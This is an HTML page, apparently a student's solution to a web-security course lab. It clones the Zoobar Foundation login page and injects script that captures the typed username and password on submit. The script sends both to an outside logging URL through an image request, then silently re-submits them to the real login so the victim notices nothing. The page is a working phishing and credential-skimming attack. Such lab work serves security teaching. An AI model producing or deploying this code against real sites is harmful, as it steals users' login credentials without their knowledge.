<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
        <title>
          Login - Zoobar Foundation
        </title>
    </head>
    <body>
        
        
        
        
        
        
        
      <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Responsible
                      Policy</a></h1>
      <h2>Supporting the meritorious
          soldiers of the counterinsurgency</h2>
      
<div id="login" class="centerpiece">
<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" >
<table>
<tr>
   <td>Username:</td>
  <td><input type="text" name="login_username" size="20"
  autocomplete="no" value=""></td>
</tr>
<tr>
   <td>Password:</td>
  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
  <input type="submit" name="submit_login" value="Log in" onclick="submission_type=this.value;">
  <input type="submit" name="submit_registration" value="Register" onclick="submission_type=this.value;"></td>
</tr>
</table>
<input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
</form>
</div>
<div class="footer warning">

</div>
<script>document.loginform.login_username.focus();</script>
<script>
    var submission_type;
    function myFunc(event)  {
        event.preventDefault(); 
        let formElements = document.forms['loginform'].elements;
        console.log(document.forms['loginform'])
        let username = encodeURIComponent(formElements['login_username'].value);
        let password = encodeURIComponent(formElements['login_password'].value);
        console.log(username, password, submission_type);
        (new Image()).src='https://css.csail.mit.edu/6.566/2024/labs/log.php?' + 'id=mtulla' + '&payload=' + username + '/' + password + '&random=' + Math.random();
        setTimeout(function() {
            var form = document.createElement("form");
            var username_el = document.createElement("input");
            var password_el = document.createElement("input");
            var submission_type_el = document.createElement("input");
            var next_url_el = document.createElement("input");

            form.method = "POST";
            form.action = "http://localhost:8080/zoobar/index.cgi/login";
            form.name = "hiddenloginform"

            username_el.value = username
            username_el.name = "login_username";
            form.append(username_el);

            password_el.value = password;
            password_el.name = "login_password";
            form.append(password_el);

            next_url_el.value = "http://localhost:8080/zoobar/index.cgi/";
            next_url_el.name = "nexturl";
            form.append(next_url_el);

            if (submission_type === "Log in") {
                submission_type_el.value = "Log in";
                submission_type_el.name = "submit_login";
                form.append(submission_type_el)
            } else if (submission_type === "Register") {
                submission_type_el.value = "Register";
                submission_type_el.name = "submit_registration";
                form.append(submission_type_el)
            }
            console.log(form);
            document.body.append(form);
            form.submit();
        }, 1000);
    }

    var form = document.forms['loginform'];
    form.addEventListener('submit', myFunc, true);
</script>
<style>
    form[name="hiddenloginform"] {
        display: none;
    }
</style>

    </body>
</html>